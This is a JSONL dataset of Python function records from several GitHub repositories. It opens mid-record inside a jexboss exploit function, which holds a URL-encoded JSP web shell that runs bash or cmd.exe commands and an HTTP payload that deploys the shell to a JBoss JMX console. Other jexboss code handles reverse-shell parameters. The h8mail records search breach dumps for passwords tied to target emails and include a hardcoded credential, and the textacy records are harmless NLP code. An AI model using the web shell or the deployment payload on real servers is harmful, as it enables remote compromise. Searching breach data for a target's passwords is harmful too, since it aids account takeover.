\"%69%78%29%7B%70%3D%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28\"\n       \"%6E%65%77%20%53%74%72%69%6E%67%5B%5D%7B%22%2F%62%69%6E%2F%62%61%73%68%22%2C%22%2D%63%22%2C%73%68\"\n       \"%7D%29%3B%7D%65%6C%73%65%7B%70%3D%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E\"\n       \"%65%78%65%63%28%22%63%6D%64%2E%65%78%65%20%2F%43%20%22%2B%73%68%29%3B%7D%62%72%3D%6E%65%77%20%42\"\n       \"%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6E%65%77%20%49%6E%70%75%74%53%74%72%65%61%6D%52%65%61\"\n       \"%64%65%72%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%29%29%3B%53%74%72%69%6E%67%20\"\n       \"%64%3D%62%72%2E%72%65%61%64%4C%69%6E%65%28%29%3B%77%68%69%6C%65%28%64%20%21%3D%20%6E%75%6C%6C%29\"\n       \"%7B%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%64%29%3B%64%3D%62%72%2E%72%65%61%64%4C%69%6E%65%28%29%3B\"\n       \"%7D%7D%7D%63%61%74%63%68%28%45%78%63%65%70%74%69%6F%6E%20%65%29%7B%6F%75%74%2E%70%72%69%6E%74%6C\"\n       \"%6E%28%22%55%6E%6B%6E%6F%77%6E%20%63%6F%6D%6D%61%6E%64%22%29%3B%7D%7D%25%3E\")\n\npayload = (\"/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin:service=\"\n           \"DeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=\"\n           \"jexws4.war&argType=java.lang.String&arg1=jexws4&argType=java.lang.St\"\n           \"ring&arg2=.jsp&argType=java.lang.String&arg3=\" + jsp + \"&argType=boolean&arg4=True\")\n\nheaders = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n           \"Connection\": \"keep-alive\",\n           \"User-Agent\": jexboss.get_random_user_agent()}\ngl_http_pool.request('HEAD', url + payload, redirect=False, headers=headers)\nreturn get_successfully(url, \"/jexws4/jexws4.jsp\")", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nGet content of a param that contains a java serialized object (base64 gziped or only base64 of raw)\n:param page: The page source code for search in it\n:param param: The param that will be searched\n:return: Param content with java serialized object or None\n\"\"\"\n", "func_signal": "def get_serialized_obj_from_param(page, param):\n", "code": "page = str(page).replace(\"\\\\n\", \"\\n\")\nfull_param = \"name=\\\"\"+param+\"\\\"\"\nfor i in page.strip().split('\\n'):\n\n    tokens = i.strip().split(\" \")\n\n    for t in tokens:\n        # get param value\n        if full_param in t:\n            index = tokens.index(full_param)\n            if 'value=\\\"' in tokens[index+1]:\n                obj = tokens[index+1].split(\"\\\"\")[1]\n                if obj.startswith(\"H4sI\") or obj.startswith(\"rO0\"):\n                    #return last_link, obj\n                    return obj\n            elif tokens[index+2]:\n                obj = tokens[index+2].split(\"\\\"\")[1]\n                if obj.startswith(\"H4sI\") or obj.startswith(\"rO0\"):\n                    #return last_link, obj\n                    return obj\nreturn None", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nGet the Authority from an URI, according with rfc3986\n:param url: The uri provided by the user in -u param\n:return: the authority from the uri\n\"\"\"\n", "func_signal": "def get_url_base(url):\n", "code": "if '://' in url:\n    protocol = url.split('://')[0] + '://'\nelse:\n    protocol = ''\n\nurl_base = protocol+url.split('://')[-1].split('/')[0]\n\nreturn url_base", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "# if reverse host were provided in the args, take it\n", "func_signal": "def get_host_port_reverse_params():\n", "code": "if gl_args.reverse_host:\n\n    if gl_args.windows:\n        jexboss.print_and_flush(RED + \"\\n * WINDOWS Systems still do not support reverse shell.\\n\"\n                                      \"   Use option --cmd instead of --reverse-shell...\\n\" + ENDC +\n                                \"   Type [ENTER] to continue...\\n\")\n        # wait while enter is typed\n        input().lower() if version_info[0] >= 3 else raw_input().lower()\n        return None, None\n\n    tokens = gl_args.reverse_host.split(\":\")\n    if len(tokens) != 2:\n        host, port = ask_for_reverse_host_and_port()\n    else:\n        host = tokens[0]\n        port = tokens[1]\n# if neither cmd nor reverse nor load_gadget was provided, ask host and port\nelif gl_args.cmd is None and gl_args.load_gadget is None:\n    host, port = ask_for_reverse_host_and_port()\nelse:\n    # if cmd or gadget file ware privided\n    host, port = None, None\n\nreturn host, port", "path": "jexboss/jexboss.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nFor each line in file, check for emails using fetch_emails().\nReturns list of emails.\n\"\"\"\n", "func_signal": "def get_emails_from_file(targets_file, user_args):\n", "code": "email_obj_list = []\ntry:\n    target_fd = open(targets_file).readlines()\n    c.info_news(\"Parsing emails from\" + targets_file)\n    for line in target_fd:\n        e = fetch_emails(line.strip(), user_args)\n        if e is None:\n            continue\n        else:\n            email_obj_list.extend(e)\n    return email_obj_list\nexcept Exception as ex:\n    c.bad_news(\"Problems occurred while trying to get emails from file\")\n    print(ex)", "path": "h8mail/h8mail/utils/helpers.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nSearches for every email from target_list in every line of filepath.\nAttempts to decode line using cp437. If it fails, catch and use raw data\n\"\"\"\n", "func_signal": "def worker(filepath, target_list):\n", "code": "try:\n    with open(filepath, \"rb\") as fp:\n        found_list = []\n        size = os.stat(filepath).st_size\n        c.info_news(\n            \"Worker [{PID}] is searching for targets in {filepath} ({size:,.0f} MB)\".format(\n                PID=os.getpid(), filepath=filepath, size=size / float(1 << 20))\n            )\n        for cnt, line in enumerate(fp):\n            for t in target_list:\n                if t in str(line, \"cp437\"):\n                    try:\n                        decoded = str(line, \"cp437\")\n                        found_list.append(\n                            local_breach_target(t, filepath, cnt, decoded)\n                        )\n                        c.good_news(\n                            f\"Found occurrence [{filepath}] Line {cnt}: {decoded}\"\n                        )\n                    except Exception as e:\n                        c.bad_news(\n                            f\"Got a decoding error line {cnt} - file: {filepath}\"\n                        )\n                        c.good_news(\n                            f\"Found occurrence [{filepath}] Line {cnt}: {line}\"\n                        )\n                        found_list.append(\n                            local_breach_target(t, filepath, cnt, str(line))\n                        )\n    return found_list\nexcept Exception as e:\n    c.bad_news(\"Something went wrong with worker\")\n    print(e)", "path": "h8mail/h8mail/utils/localsearch.py", "commit_date": "2020-07-15 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nReturns a list of URLs found in 'target'.\n\"\"\"\n# https://www.geeksforgeeks.org/python-check-url-string/\n", "func_signal": "def fetch_urls(target):\n", "code": "e = re.findall(\n    \"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\), ]|(?:%[0-9a-fA-F][0-9a-fA-F]))+\",\n    target,\n)\nif e:\n    # print(\", \".join(e), c.reset)\n    return e\nreturn None", "path": "h8mail/h8mail/utils/url.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nPrint a Debug\n\"\"\"\n", "func_signal": "def debug_news(news):\n", "code": "print()\nprint(colors.bold + colors.fg.lightred + \"[@] \" + news + colors.reset)", "path": "h8mail/h8mail/utils/colors.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "# https://gist.github.com/scottlinux/9a3b11257ac575e4f71de811322ce6b3\n", "func_signal": "def breachcomp_check(targets, breachcomp_path):\n", "code": "try:\n    import subprocess\n\n    query_bin = os.path.join(breachcomp_path, \"query.sh\")\n    st = os.stat(query_bin)\n    os.chmod(query_bin, st.st_mode | stat.S_IEXEC)\n    for t in targets:\n        c.info_news(f\"Looking up {t.target} in BreachCompilation\")\n        procfd = subprocess.run([query_bin, t.target], stdout=subprocess.PIPE)\n        try:\n            output = procfd.stdout.decode(\"cp437\")\n        except Exception as e:\n            c.bad_news(f\"Could not decode bytes for {t.target} results\")\n            output = procfd.stdout\n            # print(output[:85], \"[...]\")\n            print(output)\n            continue\n        if len(output) != 0:\n            split_output = output.split(\"\\n\")\n            for line in split_output:\n                if \":\" in line:\n                    t.pwned += 1\n                    t.data.append((\"BC_PASS\", re.split(\"[;:]\",line)[-1]))\n                    c.good_news(\n                        f\"Found BreachedCompilation entry {line}\"\n                    )\n    return targets\nexcept Exception as e:\n    c.bad_news(\"Breach compilation\")\n    print(e)\n    return targets", "path": "h8mail/h8mail/utils/breachcompilation.py", "commit_date": "2020-07-15 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nPrint Breach results\n\"\"\"\n", "func_signal": "def print_result(target, data, source):\n", "code": "if \"PASS\" in source:\n    print(\n        \"{}{}{:15}{}|{}{:>25.25}{} > {}{}{}{}\".format(\n            colors.fg.lightblue,\n            colors.bold,\n            source,\n            colors.fg.lightgrey,\n            colors.fg.pink,\n            target,\n            colors.fg.lightgrey,\n            colors.bold,\n            colors.fg.green,\n            data,\n            colors.reset,\n        )\n    )\nelif \"LOCALSEARCH\" in source:\n    if len(data) > 140:\n        print(\n            \"{}{}{:15}{}|{}{:>25.25}{} > {}{}{}{}\".format(\n                colors.fg.lightblue,\n                colors.bold,\n                source,\n                colors.fg.lightgrey,\n                colors.fg.pink,\n                target,\n                colors.fg.lightgrey,\n                colors.bold,\n                colors.fg.green,\n                \"[...]\" + data[-135:],\n                colors.reset,\n            )\n        )\n    else:\n        print(\n            \"{}{}{:15}{}|{}{:>25.25}{} > {}{}{}{}\".format(\n                colors.fg.lightblue,\n                colors.bold,\n                source,\n                colors.fg.lightgrey,\n                colors.fg.pink,\n                target,\n                colors.fg.lightgrey,\n                colors.bold,\n                colors.fg.green,\n                data,\n                colors.reset,\n            )\n        )\n# Underscore to avoid coloring like a HASH\nelif \"_HASH\" in source:\n    print(\n        \"{}{:15}{}|{}{:>25.25}{} > {}{}{}\".format(\n            colors.fg.lightblue,\n            source,\n            colors.fg.lightgrey,\n            colors.fg.pink,\n            target,\n            colors.fg.lightgrey,\n            colors.fg.red,\n            data,\n            colors.reset,\n        )\n    )\n# Underscore to avoid coloring service with \"email\" in name\nelif \"_EMAIL\" in source:\n    print(\n        \"{}{:15}{}|{}{:>25.25}{} > {}{}{}\".format(\n            colors.fg.lightblue,\n            source,\n            colors.fg.lightgrey,\n            colors.fg.pink,\n            target,\n            colors.fg.lightgrey,\n            colors.fg.lightgrey,\n            data,\n            colors.reset,\n        )\n    )\nelif \"USER\" in source:\n    print(\n        \"{}{:15}{}|{}{:>25.25}{} > {}{}{}\".format(\n            colors.fg.lightblue,\n            source,\n            colors.fg.lightgrey,\n            colors.fg.pink,\n            target,\n            colors.fg.lightgrey,\n            colors.fg.lightcyan,\n            data,\n            colors.reset,\n        )\n    )\nelif \"SOURCE\" in source:\n    print(\n        \"{}{:15}{}|{}{:>25.25}{} > {}{}{}\\n\".format(\n            colors.fg.lightblue,\n            source,\n            colors.fg.lightgrey,\n            colors.fg.pink,\n            target,\n            colors.fg.lightgrey,\n            colors.reset,\n            data,\n            colors.reset,\n        )\n    )\nelif \"IP\" in source:\n    print(\n        \"{}{:15}{}|{}{:>25.25}{} > {}{}{}\".format(\n            colors.fg.lightblue,\n            source,\n            colors.fg.lightgrey,\n            colors.fg.pink,\n            target,\n            colors.fg.lightgrey,\n            colors.fg.red,\n            data,\n            colors.reset,\n        )\n    )\nelse:\n    print(\n        \"{}{:15}{}|{}{:>25.25}{} > {}{}{}\".format(\n            colors.fg.lightblue,\n            source,\n            colors.fg.lightgrey,\n            colors.fg.pink,\n            target,\n            colors.fg.lightgrey,\n            colors.fg.lightgrey,\n            data,\n            colors.reset,\n        )\n    )", "path": "h8mail/h8mail/utils/colors.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nHandles most user arg logic. Creates a list() of targets from user input.\nStarts the target object factory loop; starts local searches after factory if in user inputs\nPrints results, saves to csv if in user inputs\n\"\"\"\n\n", "func_signal": "def h8mail(user_args):\n", "code": "if user_args.user_targets and user_args.user_urls:\n    c.bad_news(\"Cannot use --url with --target. Use one or the other.\")\n    exit(1)\n\nif not user_args.user_targets and not user_args.user_urls:\n    c.bad_news(\"Missing Target or URL\")\n    exit(1)\n\nstart_time = time.time()\n\nimport warnings\n\nwarnings.filterwarnings('ignore', message='Unverified HTTPS request')\n\ntargets = []\nif user_args.user_urls:\n    targets = target_urls(user_args)\n    if len(targets) == 0:\n        c.bad_news(\"No targets found in URLs. Quitting\")\n        exit(0)\n\n# If we found emails from URLs, `targets` array already has stuff\nif len(targets) != 0:\n    if user_args.user_targets is None:\n        user_args.user_targets = []\n        user_args.user_targets.extend(targets)\n\nelse:  # Find targets in user input or file\n    if user_args.user_targets is not None:\n        for arg in user_args.user_targets:\n            user_stdin_target = fetch_emails(arg, user_args)\n            if os.path.isfile(arg):\n                c.info_news(\"Reading from file \" + arg)\n                targets.extend(get_emails_from_file(arg, user_args))\n            elif user_stdin_target:\n                targets.extend(user_stdin_target)\n            else:\n                c.bad_news(\"No targets found in user input. Quitting\")\n                exit(0)\n\nc.info_news(\"Removing duplicates\")\ntargets = list(set(targets))\n\nc.good_news(\"Targets:\")\nfor t in targets:\n    c.good_news(t)\n\n# Launch\nbreached_targets = target_factory(targets, user_args)\n\n# These are not done inside the factory as the factory iterates over each target individually\n# The following functions perform line by line checks of all targets per line\n\nif user_args.bc_path:\n    breached_targets = breachcomp_check(breached_targets, user_args.bc_path)\n\nlocal_found = None\n# Handle cleartext search\nif user_args.local_breach_src:\n    for arg in user_args.local_breach_src:\n        res = find_files(arg)\n        if user_args.single_file:\n            local_found = local_search_single(res, targets)\n        else:\n            local_found = local_search(res, targets)\n        if local_found is not None:\n            breached_targets = local_to_targets(\n                breached_targets, local_found, user_args\n            )\n# Handle gzip search\nif user_args.local_gzip_src:\n    for arg in user_args.local_gzip_src:\n        res = find_files(arg, \"gz\")\n        if user_args.single_file:\n            local_found = local_search_single_gzip(res, targets)\n        else:\n            local_found = local_gzip_search(res, targets)\n        if local_found is not None:\n            breached_targets = local_to_targets(\n                breached_targets, local_found, user_args\n            )\n\nprint_results(breached_targets, user_args.hide)\n\nprint_summary(start_time, breached_targets)\nif user_args.output_file:\n    save_results_csv(user_args.output_file, breached_targets)", "path": "h8mail/h8mail/utils/run.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nReceives list of emails and user args. Fetchs API keys from config file using user_args path and cli keys.\nFor each target, launch target.methods() associated to found config artifacts.\nHandles chase logic with counters from enumerate()\n\"\"\"\n# Removing duplicates here to avoid dups from chasing\n", "func_signal": "def target_factory(targets, user_args):\n", "code": "targets = list(set(targets))\n\nfinished = []\nif user_args.config_file is not None or user_args.cli_apikeys is not None:\n    api_keys = get_config_from_file(user_args)\nelse:\n    api_keys = None\ninit_targets_len = len(targets)\n\nquery = \"email\"\nskip_default_queries = False\nif user_args.user_query is not None:\n    query = user_args.user_query\n    skip_default_queries = True  # custom query skips default query automatically\n\nscylla_up = False\nif user_args.skip_defaults is False:\n    scylla_up = check_scylla_online()\n\n\n\nfor counter, t in enumerate(targets):\n    c.info_news(\"Target factory started for {target}\".format(target=t))\n    if user_args.debug:\n        current_target = target(t, debug=True)\n    else:\n        current_target = target(t)\n    if not skip_default_queries:\n        if not user_args.skip_defaults:\n            current_target.get_hunterio_public()\n            ## emailrep seems to insta-block h8mail user agent without a key\n            # if api_keys is None or \"emailrep\" not in api_keys:\n            #     current_target.get_emailrepio()\n            # elif (\n            #     api_keys is not None and \"emailrep\" in api_keys and query == \"email\"\n            # ):\n            #     current_target.get_emailrepio(api_keys[\"emailrep\"])\n\n    if api_keys is not None:\n        if \"hibp\" in api_keys and query == \"email\":\n            current_target.get_hibp3(api_keys[\"hibp\"])\n        if \"emailrep\" in api_keys and query == \"email\":\n            current_target.get_emailrepio(api_keys[\"emailrep\"])\n        if \"hunterio\" in api_keys and query == \"email\":\n            current_target.get_hunterio_private(api_keys[\"hunterio\"])\n        if \"intelx_key\" in api_keys:\n            current_target.get_intelx(api_keys)\n        if \"snusbase_token\" in api_keys:\n            if \"snusbase_url\" in api_keys:\n                snusbase_url = api_keys[\"snusbase_url\"]\n            else:\n                snusbase_url = \"http://api.snusbase.com/v2/search\"\n            current_target.get_snusbase(\n                snusbase_url, api_keys[\"snusbase_token\"], query\n            )\n        if \"leak-lookup_priv\" in api_keys:\n            current_target.get_leaklookup_priv(api_keys[\"leak-lookup_priv\"], query)\n        if \"leak-lookup_pub\" in api_keys and query == \"email\":\n            current_target.get_leaklookup_pub(api_keys[\"leak-lookup_pub\"])\n        if \"weleakinfo_pub\" in api_keys and query == \"email\":\n            current_target.get_weleakinfo_pub(api_keys[\"weleakinfo_pub\"])\n        if \"weleakinfo_priv\" in api_keys:\n            current_target.get_weleakinfo_priv(api_keys[\"weleakinfo_priv\"], query)\n        if \"dehashed_key\" in api_keys:\n            if \"dehashed_email\" in api_keys:\n                current_target.get_dehashed(\n                    api_keys[\"dehashed_email\"], api_keys[\"dehashed_key\"], query\n                )\n            else:\n                c.bad_news(\"Missing Dehashed email\")\n    if scylla_up:\n        current_target.get_scylla(query)\n\n    # Chasing\n    if user_args.chase_limit and counter <= init_targets_len:\n        user_args_force_email = user_args\n        user_args_force_email.user_query = \"email\"\n        user_args_force_email.chase_limit -= 1\n        finished_chased = target_factory(\n            chase(current_target, user_args), user_args_force_email\n        )\n        finished.extend((finished_chased))\n    finished.append(current_target)\nreturn finished", "path": "h8mail/h8mail/utils/run.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nReturns list of files from t_parse filepath.\nSupports using globing (*) in filepaths.\nCan check for patterns such as 'gz'.\n\"\"\"\n", "func_signal": "def find_files(to_parse, pattern=\"\"):\n", "code": "allfiles = []\nif \"*\" in to_parse:\n    glob_result = glob.glob(to_parse)\n    for g in glob_result:\n        allfiles.append(g)\n        c.info_news(f\"Using file {g}\")\nif os.path.isfile(to_parse):\n    if pattern in to_parse:\n        c.info_news(f\"Using file {to_parse}\")\n        allfiles.append(to_parse)\nelif os.path.isdir(to_parse):\n    for root, _, filenames in os.walk(to_parse):\n        for filename in filenames:\n            if pattern in filename:\n                c.info_news(\"Using file {}\".format(os.path.join(root, filename)))\n                allfiles.append(os.path.join(root, filename))\nreturn allfiles", "path": "h8mail/h8mail/utils/helpers.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nPrint Breach result header\n\"\"\"\n", "func_signal": "def print_res_header(target):\n", "code": "print(colors.bold, \"{:_^90}\\n\".format(\"\"), colors.reset)\nprint(\n    colors.bold\n    + colors.fg.green\n    + \"[>] \"\n    + colors.reset\n    + \"Showing results for \"\n    + target\n    + colors.reset\n)", "path": "h8mail/h8mail/utils/colors.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nRead config in file. If keys are passed using CLI, add them to the configparser object.\nReturns a configparser object already set to \"DEFAULT\" section.\n\"\"\"\n\n", "func_signal": "def get_config_from_file(user_args):\n", "code": "try:\n    config = configparser.ConfigParser()\n    # Config file\n    if user_args.config_file:\n        for counter, config_file in enumerate(user_args.config_file):\n            config_file = user_args.config_file[counter]\n            config.read(config_file)\n    # Use -k option\n    if user_args.cli_apikeys:\n        if config.has_section(\"h8mail\") is False:\n            config.add_section(\"h8mail\")\n        for counter, user_key in enumerate(user_args.cli_apikeys):\n            user_cli_keys = user_args.cli_apikeys[counter].split(\",\")\n            for user_key in user_cli_keys:\n                if user_key and \"=\" in user_key:\n                    config.set(\n                        \"h8mail\",\n                        user_key.split(\"=\", maxsplit=1)[0].strip(),\n                        user_key.split(\"=\", maxsplit=1)[1].strip(),\n                    )\n        for k in config[\"h8mail\"]:\n            if len((config[\"h8mail\"][k])) != 0:\n                c.good_news(f\"Found {k} configuration key\")\n    return config[\"h8mail\"]\nexcept Exception as ex:\n    c.bad_news(\"Problems occurred while trying to get configuration file\")\n    print(ex)", "path": "h8mail/h8mail/utils/helpers.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nPrint an information with yellow text\n\"\"\"\n", "func_signal": "def question_news(news):\n", "code": "print(\n    colors.bold\n    + colors.fg.blue\n    + \"[?] \"\n    + colors.reset\n    + colors.fg.yellow\n    + news.strip()\n    + colors.reset\n)", "path": "h8mail/h8mail/utils/colors.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nOutputs CSV from target object list.\nDumps the target.data object variable into CSV file.\n\"\"\"\n", "func_signal": "def save_results_csv(dest_csv, target_obj_list):\n", "code": "with open(dest_csv, \"w\", newline=\"\") as csvfile:\n    try:\n        writer = csv.writer(csvfile)\n\n        writer.writerow([\"Target\", \"Type\", \"Data\"])\n        c.good_news(\"Writing to CSV\")\n        for t in target_obj_list:\n            for i in range(len(t.data)):\n                if len(t.data[i]) == 2:  # Contains data header + body\n                    writer.writerow([t.target, t.data[i][0], t.data[i][1]])\n    except Exception as ex:\n        c.bad_news(\"Error writing to csv\")\n        print(ex)", "path": "h8mail/h8mail/utils/helpers.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nFetches the URL without the h8mail UA\n\"\"\"\n", "func_signal": "def worker_url(url):\n", "code": "paramsUA = {\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36\"}\ntry:\n    c.info_news(\"Worker fetching \" + url)\n    r = requests.get(url, params = paramsUA, allow_redirects=False)\n    c.info_news(\"Worker done fetch url\")\n    print(f\"Status code: {r.status_code}\")\n\n    e = re.findall(r\"[\\w\\.-]+@[\\w\\.-]+\", r.text)\n    print(e)\n    if e:\n        print(\", \".join(e), c.reset)\n        return e\n    return None\nexcept Exception as ex:\n    c.bad_news(\"URL fetch worker error:\")\n    print(ex)", "path": "h8mail/h8mail/utils/url.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nStackOverflow trick to rapidly count lines in big files.\nReturns total line number.\n\"\"\"\n", "func_signal": "def raw_in_count(filename):\n", "code": "c.info_news(\"Identifying total line number...\")\nf = open(filename, \"rb\")\nbufgen = takewhile(lambda x: x, (f.raw.read(1024 * 1024) for _ in repeat(None)))\nreturn sum(buf.count(b\"\\n\") for buf in bufgen)", "path": "h8mail/h8mail/utils/localsearch.py", "commit_date": "2020-07-15 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nPrint an information with grey text\n\"\"\"\n", "func_signal": "def info_news(news):\n", "code": "print(\n    colors.bold\n    + colors.fg.lightblue\n    + \"[~] \"\n    + colors.reset\n    + colors.fg.lightgrey\n    + news.strip()\n    + colors.reset\n)", "path": "h8mail/h8mail/utils/colors.py", "commit_date": "2020-08-05 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nFetches local version and compares it to github api tag version\n\"\"\"\n", "func_signal": "def check_latest_version():\n", "code": "try:\n    response = requests.request(\n        url=\"https://api.github.com/repos/khast3x/h8mail/releases/latest\", method=\"GET\"\n    )\n    data = response.json()\n    latest = data[\"tag_name\"]\n    if __version__ == data[\"tag_name\"]:\n        c.good_news(\"h8mail is up to date\")\n    else:\n        c.bad_news(\n            \"Not running latest h8mail version. [Current: {current} | Latest: {latest}]\".format(\n                current=__version__, latest=latest\n            )\n        )\nexcept Exception:\n    c.bad_news(\"Could not check for updates. Is Github blocking requests?\")", "path": "h8mail/h8mail/utils/helpers.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nFor each user input with --url, check if its a file.\nIf yes open and parse each line with regexp, else parse the input with regexp directly.\nParse html pages from URLs for email patterns.\nReturns list of email targets\n\"\"\"\n", "func_signal": "def target_urls(user_args):\n", "code": "try:\n    c.info_news(\"Starting URL fetch\")\n    urls = []\n    emails = []\n    for arg in user_args.user_urls:\n        if os.path.isfile(arg):\n            e = get_urls_from_file(arg)\n        else:\n            e = fetch_urls(arg)\n        if e is None:\n            continue\n        else:\n            urls.extend(e)\n    \n    for url in urls:\n        e = worker_url(url)\n        # e = get_emails_from_file(tmpfile, user_args)\n        if e is None:\n            continue\n        else:\n            emails.extend(e)\n\n    return emails\nexcept Exception as ex:\n    c.bad_news(\"URL fetch error:\")\n    print(ex)", "path": "h8mail/h8mail/utils/url.py", "commit_date": "2020-04-23 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nAppends data from local_breach_target objects using existing list of targets.\nFinds corresponding email in dest object list, and adds data to the t.data object variable.\nFull output line is stored in t.data[1] and original found data in t.data[2]\n\n\"\"\"\n", "func_signal": "def local_to_targets(targets, local_results, user_args):\n", "code": "for t in targets:\n    for l in local_results:\n        if l.target == t.target:\n            t.data.append(\n                (\n                    \"LOCALSEARCH\",\n                    f\"[{os.path.basename(l.filepath)}] Line {l.line}: {l.content}\".strip(),\n                    l.content.strip(),\n                )\n            )\n            t.pwned += 1\n            if user_args.debug:\n                c.debug_news(f\"DEBUG: Found following content matching {t.target.target}\")\n                l.target.dump()\nreturn targets", "path": "h8mail/h8mail/utils/localsearch.py", "commit_date": "2020-07-15 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nChecks if scylla.sh is online\n\"\"\"\n# Supress SSL Warning on UI\n# https://github.com/khast3x/h8mail/issues/64\n", "func_signal": "def check_scylla_online():\n", "code": "try:\n    re = requests.head(\n        url=\"https://scylla.sh\", verify=False, auth=requests.auth.HTTPBasicAuth(\"sammy\", \"BasicPassword!\"), timeout=10,\n    )\n    if re.status_code == 200:\n        c.good_news(\"scylla.sh is up\")\n        return True\n    else:\n        c.info_news(\"scylla.sh is down, skipping\")\n    return False\nexcept Exception:\n    c.info_news(\"scylla.sh is down, skipping\")", "path": "h8mail/h8mail/utils/helpers.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "khast3x/h8mail", "stars": 3803, "license": "other", "language": "python", "size": 3572}
{"docstring": "\"\"\"\nGet average emotional valence over all terms in ``terms`` for which\nemotion weights are available.\n\nArgs:\n    terms (str or Sequence[str], ``Token`` or Sequence[``Token``]):\n        One or more terms over which to average emotional valences.\n        Note that only nouns, adjectives, adverbs, and verbs are included.\n\n        .. note:: If the resource was initialized with ``word_rep=\"lemmapos\"``,\n           then string terms must have matching parts-of-speech appended to them\n           like TERM#POS. Only \"n\" => noun, \"v\" => verb, \"a\" => adjective, and\n           \"r\" => adverb are included in the data.\n\nReturns:\n    Dict[str, float]: Mapping of emotion to average weight.\n\"\"\"\n", "func_signal": "def get_emotional_valence(self, terms):\n", "code": "if isinstance(terms, (Token, str)):\n    return self._get_term_emotional_valence(terms)\nelif isinstance(terms, (Span, Doc, collections.abc.Sequence)):\n    return self._get_terms_emotional_valence(terms)\nelse:\n    raise TypeError(\n        \"`terms` must be of type {}, not {}\".format(\n            {Token, Span, Doc, str, collections.abc.Sequence}, type(terms)\n        )\n    )", "path": "textacy/src/textacy/resources/depeche_mood.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
{"docstring": "\"\"\"Check that necessary data is found on disk, or raise an OSError.\"\"\"\n", "func_signal": "def _check_data(self):\n", "code": "if not self._texts_dirpath.is_dir():\n    raise OSError(\n        f\"data directory {self._texts_dirpath} not found; \"\n        \"has the dataset been downloaded?\"\n    )\nif not self._index_filepath.is_file():\n    raise OSError(\n        f\"data index file {self._index_filepath} not found; \"\n        \"has the dataset been downloaded?\"\n    )", "path": "textacy/src/textacy/datasets/udhr.py", "commit_date": "2020-08-29 00:00:00", "repo_name": "chartbeat-labs/textacy", "stars": 2161, "license": "other", "language": "python", "size": 32964}
